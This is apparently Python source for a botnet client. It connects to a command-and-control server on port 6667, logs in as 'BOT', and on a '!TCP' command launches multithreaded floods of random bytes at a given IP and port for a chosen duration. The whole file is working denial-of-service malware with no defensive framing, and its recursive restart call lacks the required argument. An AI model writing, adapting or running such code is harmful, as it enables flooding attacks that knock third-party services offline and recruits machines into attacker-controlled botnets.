
import time
import socket
import random
import threading
from   os        import urandom
from   pytermx   import Color
from   datetime  import datetime

C2_ADDRESS  = "127.0.0.1"
C2_PORT     = 6667

class Log:
    @staticmethod
    def _log(prefix, message):
        timestamp = datetime.fromtimestamp(time.time()).strftime("%H:%M:%S")
        log_message = f"[{Color.GREY}{timestamp}{Color.RESET}] {prefix} {message}"

        return log_message

    @staticmethod
    def Success(message, prefix="[ + ]", color=Color.BRIGHT_GREEN):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Error(message, prefix="[ - ]", color=Color.BRIGHT_RED):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Debug(message, prefix="[ ~ ]", color=Color.BRIGHT_PURPLE):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Solved(message, prefix="[ + ]", color=Color.BRIGHT_CYAN):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Info(message, prefix="[ ? ]" , color=Color.BRIGHT_WHITE):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)

    @staticmethod
    def Warning(message, prefix="[ ! ]", color=Color.BRIGHT_YELLOW):
        return Log._log(f"{color}{prefix}{Color.RESET}", message)
    
def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.connect((ip, port))

            while time.time() < secs:
                print("Sending")
                s.send(urandom(size))
        except:
            pass

def main(ip):
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            c2.connect((ip, 6667))

            while 1:
                c2.send("669787761736865726500".encode())
                break
            while 1:
                time.sleep(1)

                data = c2.recv(1024).decode()

                if "Username" in data:
                    c2.send("BOT".encode())
                    break
            while 1:
                time.sleep(1)

                data = c2.recv(1024).decode()

                if "Password" in data:
                    c2.send("\xff\xff\xff\xff\75".encode("cp1252"))
                    break
            break
        except:
            time.sleep(5)
    while 1:
        try:
            data = c2.recv(1024).decode().strip()

            if not data:
                break

            args = data.split(" ")
            command = args[0].upper()

            print(command)

            if command == "!TCP":
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target = attack_tcp, args = (ip, port, secs, size), daemon = True).start()
            elif command == "PING":
                print("Uptime !")
                c2.send("PONG".encode())
        except Exception as e:
            print(e)
            break

    c2.close()
    main()

if __name__ == "__main__":
    ip = input("IP> ")
    try:
        main(ip)
    except:
        pass